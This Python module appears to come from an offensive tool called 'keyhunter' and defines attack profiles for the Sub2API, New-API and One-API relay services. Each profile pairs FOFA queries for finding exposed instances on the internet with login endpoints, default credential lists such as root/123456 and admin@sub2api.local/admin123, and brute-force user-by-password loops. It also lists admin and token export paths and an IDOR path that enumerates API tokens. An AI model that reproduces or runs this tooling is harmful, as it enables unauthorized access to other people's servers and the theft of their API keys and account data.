from __future__ import annotations

from dataclasses import dataclass, field

from keyhunter.config import DATA, read_lines


@dataclass(frozen=True)
class ProductProfile:
    """Self-contained product pack (FOFA + fingerprint + login + export)."""

    id: str
    fofa_queries: tuple[str, ...]
    users_file: str
    passwords_file: str
    login_path: str
    login_user_field: str  # email | username
    export_path: str
    fingerprint_paths: tuple[str, ...]
    title_markers: tuple[str, ...]
    use_shared_weak_passwords: bool = True
    extra_login_fields: dict[str, str] = field(default_factory=dict)
    post_auth_paths: tuple[str, ...] = ()
    idor_path: str | None = None
    idor_max: int = 20
    required_json_markers: tuple[str, ...] = ()
    extra_credentials: tuple[tuple[str, str], ...] = ()
    auth_header_user_id: bool = False  # New-API style New-API-User header

    def users(self) -> list[str]:
        return read_lines(DATA / self.users_file)

    def product_passwords(self) -> list[str]:
        return read_lines(DATA / self.passwords_file)

    def shared_passwords(self) -> list[str]:
        if not self.use_shared_weak_passwords:
            return []
        return read_lines(DATA / "weak_passwords.txt")

    def passwords(self) -> list[str]:
        seen: set[str] = set()
        out: list[str] = []
        for pwd in [*self.product_passwords(), *self.shared_passwords()]:
            if pwd not in seen:
                seen.add(pwd)
                out.append(pwd)
        return out

    def credential_pairs(self) -> list[tuple[str, str]]:
        """Ordered (user, password) pairs: extras → each user × password list."""
        pairs: list[tuple[str, str]] = []
        seen: set[tuple[str, str]] = set()

        def add(user: str, password: str) -> None:
            key = (user, password)
            if key in seen:
                return
            seen.add(key)
            pairs.append(key)

        for user, password in self.extra_credentials:
            add(user, password)

        users = self.users()
        passwords = self.passwords()
        # Primary user exhausts full password list first (matches field observations).
        for user in users:
            for password in passwords:
                add(user, password)
        return pairs


SUB2API = ProductProfile(
    id="sub2api",
    fofa_queries=(
        'body="sub2api" && port="8080"',
        'body="sub2api" || title="Sub2API"',
        'title="Sub2API" && port="8080"',
        'body="/api/v1/settings/public" && body="sub2api"',
    ),
    users_file="emails_sub2api.txt",
    passwords_file="passwords_sub2api.txt",
    login_path="/api/v1/auth/login",
    login_user_field="email",
    export_path="/api/v1/admin/accounts/data",
    fingerprint_paths=("/api/v1/settings/public", "/", "/api/v1/auth/login"),
    title_markers=("sub2api", "Sub2API"),
    required_json_markers=("registration_enabled", "site_name", "api_base_url"),
    post_auth_paths=("/api/v1/admin/accounts?page=1&page_size=20",),
    extra_credentials=(
        ("admin@sub2api.local", "admin123"),
        ("admin@sub2api.local", "123456"),
        ("admin@sub2api.local", "sub2api"),
        ("admin@example.com", "admin123"),
    ),
)

NEWAPI = ProductProfile(
    id="newapi",
    fofa_queries=(
        'body="new-api" && body="sk-"',
        'body="new-api" && body="token"',
        'title="New API"',
        'body="/api/user/login" && body="new-api"',
    ),
    users_file="usernames_newapi.txt",
    passwords_file="passwords_newapi.txt",
    login_path="/api/user/login",
    login_user_field="username",
    export_path="/api/token/",
    fingerprint_paths=("/api/status", "/v1/models"),
    title_markers=("new-api", "new api", "New API", "newapi"),
    post_auth_paths=("/api/token/", "/api/channel/", "/api/user/self"),
    idor_path="/api/token/{id}",
    idor_max=30,
    extra_credentials=(
        ("root", "123456"),
        ("admin", "123456"),
        ("root", "admin"),
        ("admin", "admin"),
        ("admin", "password"),
    ),
    auth_header_user_id=True,
)

# One-API shares New-API-compatible admin/token surfaces in many deployments.
ONEAPI = ProductProfile(
    id="oneapi",
    fofa_queries=(
        'body="one-api" && body="sk-"',
        'body="one-api" && body="token"',
        'body="oneapi" && body="sk-"',
        'title="One API"',
    ),
    users_file="usernames_newapi.txt",
    passwords_file="passwords_newapi.txt",
    login_path="/api/user/login",
    login_user_field="username",
    export_path="/api/token/",
    fingerprint_paths=("/api/status", "/v1/models"),
    title_markers=("one-api", "one api", "oneapi", "One API"),
    post_auth_paths=("/api/token/", "/api/channel/", "/api/user/self"),
    idor_path="/api/token/{id}",
    idor_max=30,
    extra_credentials=(
        ("root", "123456"),
        ("admin", "123456"),
        ("root", "admin"),
        ("admin", "admin"),
    ),
    auth_header_user_id=True,
)

PRODUCTS: dict[str, ProductProfile] = {
    SUB2API.id: SUB2API,
    NEWAPI.id: NEWAPI,
    ONEAPI.id: ONEAPI,
}


def get_product(product_id: str) -> ProductProfile:
    key = product_id.strip().lower().replace("-", "").replace("_", "")
    aliases = {
        "sub2api": "sub2api",
        "newapi": "newapi",
        "new-api": "newapi",
        "oneapi": "oneapi",
        "one-api": "oneapi",
    }
    # normalize dashes already stripped above for lookup convenience
    resolved = {
        "sub2api": "sub2api",
        "newapi": "newapi",
        "oneapi": "oneapi",
    }.get(key)
    if resolved is None:
        # try original with hyphen forms
        resolved = aliases.get(product_id.strip().lower())
    if resolved is None or resolved not in PRODUCTS:
        known = ", ".join(sorted(PRODUCTS))
        raise SystemExit(f"unknown product {product_id!r}; choose from: {known}")
    return PRODUCTS[resolved]


def list_products() -> list[str]:
    return sorted(PRODUCTS)
